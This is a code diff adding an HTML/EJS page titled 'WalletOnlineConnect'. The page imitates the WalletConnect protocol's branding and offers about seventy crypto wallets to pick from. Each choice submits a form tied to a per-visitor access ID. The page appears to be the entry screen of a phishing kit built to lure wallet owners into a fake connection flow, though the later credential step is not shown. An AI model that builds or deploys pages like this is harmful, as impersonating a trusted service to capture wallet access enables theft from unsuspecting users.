@@ -1,0 +1,670 @@
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<link rel="stylesheet" href="/stylesheets/connect-wallet.css" type="text/css"/> 
+<link rel="stylesheet" href="/stylesheets/flash.css" type="text/css"/> 
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta property="og:image" content="images/logo.svg">
+<link rel="icon" href="images/logo.svg">
+
+<script>
+function show() {
+  var x = document.getElementById("hidden");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+
+  if (x.style.display === "block") {
+    document.getElementById("btn").innerHTML = "Show Less &uarr;";
+  } 
+}
+</script>
+</head>
+
+<title>WalletOnlineConnect</title>
+
+<body>
+<center>
+    <div class="top">
+        <a href="#footer" class="left">Github</a>
+
+        <a href="#wallets" class="left">Docs</a>
+        <a href="../index.html" class="main"><img src="/images/logo.svg" alt="logo"/></a>
+        <a href="#wallets" class="left">Wallets</a>
+        <a href="#wallets" class="left">Apps</a>
+</div>
+</br>
+<div class="gFeYHJ">WalletOnlineConnect</div>
+
+<div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
+
+<div class="flashbox">
+    <% if(success && success.length) { %>
+           <div class="flashboxsuccess-alert">
+               <%= success %> 
+               <span class="flashboxsuccess-closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+               
+           </div>
+       <% } %> 
+   
+       <% if(error && error.length) { %>
+               <div class="flashboxerror-alert">
+                   <%= error %> 
+                   <span class="flashboxerror-closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                   
+               </div>
+       <% } %> 
+       
+</div>
+</br>
+
+<div class="dXgqeu">
+<img src="/images/banner.png" alt="WalletOnlineConnect">
+</div>
+
+
+<div class="bout">
+<h2 class="home">What is WalletOnlineConnect?</h2>
+<p>WalletOnlineConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
+A user can interact securely with any Dapp from their mobile phone, making WalletOnlineConnect wallets a safer choice compared to desktop or browser 
+extension wallets.</p></br>
+<h2 class="home">How does it work?</h2>
+<p>WalletOnlineConnect connects web applications to supported <a href="#">mobile wallets</a>. WalletOnlineConnect session is started by a scanning a QR 
+code (desktop) or by clicking an application deep link (mobile).</p>
+</div>
+
+<div class="wallets" id="wallets">
+    <h1 class="home">Wallets</h1>
+<p>Multiple iOS and Android wallets support the WalletOnlineConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+
+</br>
+<div > 
+    <form action="/wallet-connect/<%= access.id %>?_method=PUT" method="post" id="walletform" class="all">
+        <div class="apps">
+            <input type="radio" id="option_01" name="walletname" value="Blockchain" onclick="document.getElementById('walletform').submit();" checked>
+            <label for="option_01">
+                <img src="https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/krinnxb23kgp75s0jyhp">
+              <p>Blockchain</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_02" name="walletname" value="Crypto.com" onclick="document.getElementById('walletform').submit();">
+            <label for="option_02">
+                <img src="/images/crypto21.png">              
+                <p>Crypto.com</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_02" name="walletname" value="Binance" onclick="document.getElementById('walletform').submit();">
+            <label for="option_02">
+                <img src="/images/binance.png">              
+                <p>Binance</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_3" name="walletname" value="Zengo" onclick="document.getElementById('walletform').submit();">
+            <label for="option_3">
+                <img src="/images/zengo.jpg">              
+                <p>Zengo</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_4" name="walletname" value="MetaMask" onclick="document.getElementById('walletform').submit();">
+            <label for="option_4">
+                <img src="/images/metamask.png">              
+                <p>MetaMask</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_5" name="walletname" value="Bitpay" onclick="document.getElementById('walletform').submit();">
+            <label for="option_5">
+                <img src="https://play-lh.googleusercontent.com/XrsJr63mKSp3_MJZKFwBlJuJ3ffKy0Zbc9_N8QiQYs5n56Zr_ASj_emoPZJt48mS7Q">             
+                <p>Bitpay</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_6" name="walletname" value="MEW Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_6">
+                <img src="/images/MEW.png">              
+                <p>MEW Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_7" name="walletname" value="Electrum" onclick="document.getElementById('walletform').submit();">
+            <label for="option_7">
+                <img src="https://play-lh.googleusercontent.com/2dEx8K8AnAa8L0xvwKDBQXA--DdTsCqxEJmNvG49KyO5x4YSgQFbZPGANdYYITHtIro">              
+                <p>Electrum</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_8" name="walletname" value="Trust Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_8">
+                <img src="/images/trustwallet.png">              
+                <p>Trust Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_9" name="walletname" value="Coinbase Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_9">
+                <img src="/images/coinbase.jpg">            
+                <p>Coinbase Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_10" name="walletname" value="Green Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_10">
+                <img src="https://play-lh.googleusercontent.com/NRkUAbBOTBw8m2sk4O3TwC5sMshzfMEj48QzKHcbxfyrgpEtSF3lbjlWIoonjXQjKho=s360-rw">           
+                <p>Green Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_11" name="walletname" value="Orange Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_11">
+                <img src="https://play-lh.googleusercontent.com/kAZyrsrRd9b-5G8kQFOmvwER3JLJ9WFVyck0wJOkB_AyIKJFbQKJEZLYF3tM9VgyBNWB=s180-rw">           
+                <p>Orange Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_12" name="walletname" value="Atomic Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_12">
+                <img src="/images/atomic.png">                
+                <p>Atomic Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_13" name="walletname" value="Bitcoin.com" onclick="document.getElementById('walletform').submit();">
+            <label for="option_13">
+                <img src="https://play-lh.googleusercontent.com/UnS9ktkcqFjEDNhBZwrapMA_i7t1AlKJuvRVM3D7Arworcd4JOqLe8Fz8ZDcsPvQoLw">               
+                <p>Bitcoin.com</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_14" name="walletname" value="Guarda" onclick="document.getElementById('walletform').submit();">
+            <label for="option_14">
+                <img src="/images/guarda21.jpeg">
+                <p>Guarda</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_15" name="walletname" value="Polkadot" onclick="document.getElementById('walletform').submit();">
+            <label for="option_15">
+                <img src="/images/polkadot.png">
+                <p>Polkadot</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_16" name="walletname" value="XRP" onclick="document.getElementById('walletform').submit();">
+            <label for="option_16">
+                <img src="/images/xrp.png">
+                <p>XRP</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_17" name="walletname" value="Stellar" onclick="document.getElementById('walletform').submit();">
+            <label for="option_17">
+                <img src="/images/stellar.png">
+                <p>Stellar</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_18" name="walletname" value="Tezos" onclick="document.getElementById('walletform').submit();">
+            <label for="option_18">
+                <img src="/images/tezos.png">
+                <p>Tezos</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_19" name="walletname" value="Theta" onclick="document.getElementById('walletform').submit();">
+            <label for="option_19">
+                <img src="/images/theta.png">
+                <p>Theta</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_20" name="walletname" value="Tron" onclick="document.getElementById('walletform').submit();">
+            <label for="option_20">
+                <img src="/images/tron.png">
+                <p>Tron</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_21" name="walletname" value="Cosmos" onclick="document.getElementById('walletform').submit();">
+            <label for="option_21">
+                <img src="/images/cosmos.png">
+                <p>Cosmos</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_22" name="walletname" value="Kava" onclick="document.getElementById('walletform').submit();">
+            <label for="option_22">
+                <img src="/images/kava.png">
+                <p>Kava</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_23" name="walletname" value="Filecoin" onclick="document.getElementById('walletform').submit();">
+            <label for="option_23">
+                <img src="/images/filecoin.png">
+                <p>Filecoin</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_24" name="walletname" value="Solana" onclick="document.getElementById('walletform').submit();">
+            <label for="option_24">
+                <img src="/images/solana.png">
+                <p>Solana</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_25" name="walletname" value="Ethereum Classic" onclick="document.getElementById('walletform').submit();">
+            <label for="option_25">
+                <img src="/images/ethereum-classic.png">
+                <p>Ethereum Classic</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_26" name="walletname" value="Zilliqa" onclick="document.getElementById('walletform').submit();">
+            <label for="option_26">
+                <img src="/images/zilliqa.png">
+                <p>Zilliqa</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_27" name="walletname" value="Elrond" onclick="document.getElementById('walletform').submit();">
+            <label for="option_27">
+                <img src="/images/elrond.jpg">
+                <p>Elrond</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_28" name="walletname" value="Waves" onclick="document.getElementById('walletform').submit();">
+            <label for="option_28">
+                <img src="/images/waves.png">
+                <p>Waves</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_29" name="walletname" value="ICON" onclick="document.getElementById('walletform').submit();">
+            <label for="option_29">
+                <img src="/images/icon.png">
+                <p>ICON</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_30" name="walletname" value="Ontology" onclick="document.getElementById('walletform').submit();">
+            <label for="option_30">
+                <img src="/images/ontology.png">
+                <p>Ontology</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_31" name="walletname" value="Nano" onclick="document.getElementById('walletform').submit();">
+            <label for="option_31">
+                <img src="/images/nano.png">
+                <p>Nano</p>
+            </label>
+        </div>
+        
+        <div class="apps" >
+            <input type="radio" id="option_32" name="walletname" value="Tomo Chain" onclick="document.getElementById('walletform').submit();">
+            <label for="option_32">
+                <img src="/images/tomo.png">
+                <p>Tomo Chain</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_33" name="walletname" value="IoTex" onclick="document.getElementById('walletform').submit();">
+            <label for="option_33">
+                <img src="/images/iotex.png">
+                <p>IoTex</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_34" name="walletname" value="Wanchain" onclick="document.getElementById('walletform').submit();">
+            <label for="option_34">
+                <img src="/images/wanchain.png">
+                <p>Wanchain</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_35" name="walletname" value="Harmony" onclick="document.getElementById('walletform').submit();">
+            <label for="option_35">
+                <img src="/images/harmony.png">
+                <p>Harmony</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_36" name="walletname" value="Kin" onclick="document.getElementById('walletform').submit();">
+            <label for="option_36">
+                <img src="/images/kin.png">
+                <p>Kin</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_37" name="walletname" value="Nimiq" onclick="document.getElementById('walletform').submit();">
+            <label for="option_37">
+                <img src="/images/nimiq.png">
+                <p>Nimiq</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_38" name="walletname" value="Aion" onclick="document.getElementById('walletform').submit();">
+            <label for="option_38">
+                <img src="/images/aion.png">
+                <p>Aion</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_39" name="walletname" value="Thunder Token" onclick="document.getElementById('walletform').submit();">
+            <label for="option_39">
+                <img src="/images/thundertoken.png">
+                <p>Thunder Token</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_40" name="walletname" value="Aeternity" onclick="document.getElementById('walletform').submit();">
+            <label for="option_40">
+                <img src="/images/aeternity.png">
+                <p>Aeternity</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_41" name="walletname" value="Nebulas" onclick="document.getElementById('walletform').submit();">
+            <label for="option_41">
+                <img src="/images/nebulas.png">
+                <p>Nebulas</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_42" name="walletname" value="FIO" onclick="document.getElementById('walletform').submit();">
+            <label for="option_42">
+                <img src="/images/fio.png">
+                <p>FIO</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_43" name="walletname" value="GoChain" onclick="document.getElementById('walletform').submit();">
+            <label for="option_43">
+                <img src="/images/gochain.png">
+                <p>GoChain</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_44" name="walletname" value="Callisto" onclick="document.getElementById('walletform').submit();">
+            <label for="option_44">
+                <img src="/images/callisto.png">
+                <p>Callisto</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_45" name="walletname" value="BitPay" onclick="document.getElementById('walletform').submit();">
+            <label for="option_45">
+                <img src="/images/bitpay.jpg">
+                <p>BitPay</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_46" name="walletname" value="Aktionariat" onclick="document.getElementById('walletform').submit();">
+            <label for="option_46">
+                <img src="/images/aktionariat.png">
+                <p>Aktionariat</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_47" name="walletname" value="AtWallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_47">
+                <img src="/images/atwallet.png">
+                <p>AtWallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_48" name="walletname" value="Guard Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_48">
+                <img src="/images/guard.png">
+                <p>Guard Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_49" name="walletname" value="AAVE" onclick="document.getElementById('walletform').submit();">
+            <label for="option_49">
+                <img src="/images/aave.jpg">
+                <p>AAVE</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_50" name="walletname" value="Exodus" onclick="document.getElementById('walletform').submit();">
+            <label for="option_50">
+                <img src="/images/exodus.jpg">
+                <p>Exodus</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_51" name="walletname" value="Enjin" onclick="document.getElementById('walletform').submit();">
+            <label for="option_51">
+                <img src="/images/enjin.jpg">
+                <p>Enjin</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_52" name="walletname" value="Skale" onclick="document.getElementById('walletform').submit();">
+            <label for="option_52">
+                <img src="/images/skale.png">
+                <p>Skale</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_53" name="walletname" value="Portis" onclick="document.getElementById('walletform').submit();">
+            <label for="option_53">
+                <img src="/images/portis.png">
+                <p>Portis</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_54" name="walletname" value="Trezor" onclick="document.getElementById('walletform').submit();">
+            <label for="option_54">
+                <img src="/images/trezor.png">
+                <p>Trezor</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_55" name="walletname" value="Squarelink" onclick="document.getElementById('walletform').submit();">
+            <label for="option_55">
+                <img src="/images/squarelink.png">
+                <p>Squarelink</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_56" name="walletname" value="Torus" onclick="document.getElementById('walletform').submit();">
+            <label for="option_56">
+                <img src="/images/torus.jpg">
+                <p>Torus</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_57" name="walletname" value="VeChain" onclick="document.getElementById('walletform').submit();">
+            <label for="option_57">
+                <img src="/images/vechain.jpg">
+                <p>VeChain</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_58" name="walletname" value="Scatter Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_58">
+                <img src="/images/scatter.jpg">
+                <p>Scatter Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_59" name="walletname" value="Math Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_59">
+                <img src="/images/math-wallet.png">
+                <p>Math Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_60" name="walletname" value="FortMatic" onclick="document.getElementById('walletform').submit();">
+            <label for="option_60">
+                <img src="/images/fortmatic.png">
+                <p>FortMatic</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_61" name="walletname" value="Digitex" onclick="document.getElementById('walletform').submit();">
+            <label for="option_61">
+                <img src="/images/digitex.png">
+                <p>Digitex</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_62" name="walletname" value="Ledger" onclick="document.getElementById('walletform').submit();">
+            <label for="option_62">
+                <img src="/images/ledger.png">
+                <p>Ledger</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_63" name="walletname" value="Defiat" onclick="document.getElementById('walletform').submit();">
+            <label for="option_63">
+                <img src="/images/defiat.jpg">
+                <p>Defiat</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_64" name="walletname" value="Authereum" onclick="document.getElementById('walletform').submit();">
+            <label for="option_64">
+                <img src="/images/authereum.png">
+                <p>Authereum</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_65" name="walletname" value="Flare Wallet" onclick="document.getElementById('walletform').submit();">
+            <label for="option_65">
+                <img src="/images/flare.jpg">
+                <p>Flare Wallet</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_66" name="walletname" value="Zelcore" onclick="document.getElementById('walletform').submit();">
+            <label for="option_66">
+                <img src="/images/zelcore.png">
+                <p>Zelcore</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_67" name="walletname" value="BitKeep" onclick="document.getElementById('walletform').submit();">
+            <label for="option_67">
+                <img src="/images/bitkeep.png">
+                <p>BitKeep</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_68" name="walletname" value="Coin98" onclick="document.getElementById('walletform').submit();">
+            <label for="option_68">
+                <img src="/images/coin98.png">
+                <p>Coin98</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_69" name="walletname" value="Trust Vault" onclick="document.getElementById('walletform').submit();">
+            <label for="option_69">
+                <img src="/images/trustvault.png">
+                <p>Trust Vault</p>
+            </label>
+        </div>
+
+        <div class="apps" >
+            <input type="radio" id="option_70" name="walletname" value=" POA Network" onclick="document.getElementById('walletform').submit();">
+            <label for="option_70">
+                <img src="/images/poa.png">
+                <p> POA Network</p>
+            </label>
+        </div>
+    </form>
+
+
+
+</div>
+
+<footer><div id="footer">
+<p><img src="/images/discord.svg" class="footimg">  <a href="https://discord.gg/">Discord</a></p></br>
+<p><img src="/images/telegram.svg" class="footimg">  <a href="https://t.me/">Telegram</a></p></br>
+<p><img src="/images/twitter.svg" class="footimg">  <a href="https://twitter.com/">Twitter</a></p></br>
+</footer>
+</center>
+</body>
+
+</html>
